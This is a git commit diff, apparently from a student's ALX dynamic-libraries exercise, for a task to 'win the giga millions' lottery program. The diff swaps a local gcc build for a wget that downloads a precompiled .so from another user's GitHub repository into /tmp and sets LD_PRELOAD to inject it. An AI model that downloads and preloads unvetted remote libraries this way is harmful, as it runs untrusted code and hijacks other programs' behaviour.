e378c442098571a43f1623507b2195311f306992
Abayie <jonathanboahene@gmail.com>
2022-06-17 01:29:16 +0000

    Code injection: win the giga millions

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-dir=$(dirname $(realpath $0))
-gcc -Wall -pedantic -Werror -Wextra --shared -o $dir/liball.so $dir/*.c 
+wget -P /tmp https://github.com/robby10Z/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
